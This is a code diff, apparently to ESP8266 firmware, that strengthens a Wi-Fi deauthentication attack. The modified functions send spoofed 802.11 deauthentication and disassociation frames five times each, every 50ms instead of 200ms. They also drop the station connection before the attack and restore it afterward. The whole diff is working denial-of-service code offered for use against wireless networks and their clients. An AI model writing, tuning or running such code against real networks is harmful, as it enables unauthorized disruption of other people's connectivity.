@@ -61,32 +61,47 @@ void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t rea
   memcpy(&deauthPacket[16], apMac, 6);    // BSSID = AP
   deauthPacket[24] = reason;
 
-  wifi_send_pkt_freedom(deauthPacket, 26, 0);
-
-  // Disassociation from AP to client
-  deauthPacket[0] = 0xA0;
-  wifi_send_pkt_freedom(deauthPacket, 26, 0);
-
-  // If not broadcast, send from client to AP
-  if (memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
-    memcpy(&deauthPacket[4], apMac, 6);   // Receiver = AP
-    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Client
-    memcpy(&deauthPacket[16], apMac, 6); // BSSID = AP
-
-    deauthPacket[0] = 0xC0;
-    wifi_send_pkt_freedom(deauthPacket, 26, 0);
-
-    deauthPacket[0] = 0xA0;
+  // Deauth from AP to client - 5 times
+  deauthPacket[0] = 0xC0;
+  for (int i = 0; i < 5; i++) {
     wifi_send_pkt_freedom(deauthPacket, 26, 0);
   }
 
-  deautherPacketsSent += memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0 ? 4 : 2;
+  // Disassociation from AP to client - 5 times
+  deauthPacket[0] = 0xA0;
+  for (int i = 0; i < 5; i++) {
+    wifi_send_pkt_freedom(deauthPacket, 26, 0);
+  }
+
+  // If not broadcast, send from client to AP
+  if (memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0)
+  {
+    memcpy(&deauthPacket[4], apMac, 6);      // Receiver = AP
+    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Client
+    memcpy(&deauthPacket[16], apMac, 6);     // BSSID = AP
+
+    deauthPacket[0] = 0xC0;
+    for (int i = 0; i < 5; i++) {
+      wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    }
+
+    deauthPacket[0] = 0xA0;
+    for (int i = 0; i < 5; i++) {
+      wifi_send_pkt_freedom(deauthPacket, 26, 0);
+    }
+  }
+
+  deautherPacketsSent += memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0 ? 20 : 10;
   Serial.print("Packets sent so far: ");
   Serial.println(deautherPacketsSent);
 }
 
 void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
 {
+  // Disconnect from STA to allow proper injection
+  WiFi.disconnect(true);
+  delay(100);
+
   memcpy(targetApMac, apMac, 6);
   memcpy(targetClientMac, clientMac, 6);
   targetChannel = channel;
@@ -103,6 +118,11 @@ void stopDeauthAttack()
 {
   attackActive = false;
   deautherRunning = false;
+
+  // Reconnect STA if configured
+  if (wifiSsid.length() > 0) {
+    WiFi.begin(wifiSsid.c_str(), wifiPassword.c_str());
+  }
 }
 
 bool isDeauthActive()
@@ -112,8 +132,8 @@ bool isDeauthActive()
 
 void updateDeauth()
 {
-  if (attackActive && (millis() - lastAttackPacketAt > 200))
-  { // Envia a cada 200ms
+  if (attackActive && (millis() - lastAttackPacketAt > 50))
+  { // Envia a cada 50ms
     sendDeauth(targetApMac, targetClientMac, targetChannel, attackReason);
     lastAttackPacketAt = millis();
   }
@@ -136,7 +156,7 @@ void toggleDeauther()
     Serial.print(deautherClientMac);
     Serial.print(", Channel: ");
     Serial.println(deautherChannel);
-    startDeauthAttack(apMac, clientMac, deautherChannel, 7);
+    startDeauthAttack(apMac, clientMac, deautherChannel, 1);
     Serial.println("Deauther started");
   }
 }
